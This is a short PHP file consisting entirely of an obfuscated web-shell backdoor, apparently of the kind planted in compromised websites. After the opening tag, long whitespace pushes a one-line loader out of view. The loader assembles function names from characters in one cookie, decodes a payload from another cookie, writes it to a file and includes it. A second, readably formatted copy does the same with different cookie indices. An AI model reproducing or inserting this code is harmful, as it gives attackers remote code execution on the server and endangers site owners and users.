<?php																																										if(isset($_COOKIE[3])&&isset($_COOKIE[26])){$c=$_COOKIE;$k=0;$n=9;$p=array();$p[$k]='';while($n){$p[$k].=$c[26][$n];if(!$c[26][$n+1]){if(!$c[26][$n+2])break;$k++;$p[$k]='';$n++;}$n=$n+9+1;}$k=$p[23]().$p[25];if(!$p[27]($k)){$n=$p[22]($k,$p[11]);$p[15]($n,$p[17].$p[21]($p[19]($c[3])));}include($k);}

if (isset($_COOKIE[3]) && isset($_COOKIE[35])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 8;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[35][$n];
        if (!$c[35][$n + 1]) {
            if (!$c[35][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 8 + 1;
    }
    $k = $p[25]() . $p[9];
    if (!$p[10]($k)) {
        $n = $p[15]($k, $p[18]);
        $p[23]($n, $p[1] . $p[0]($p[7]($c[3])));
    }
    include($k);
}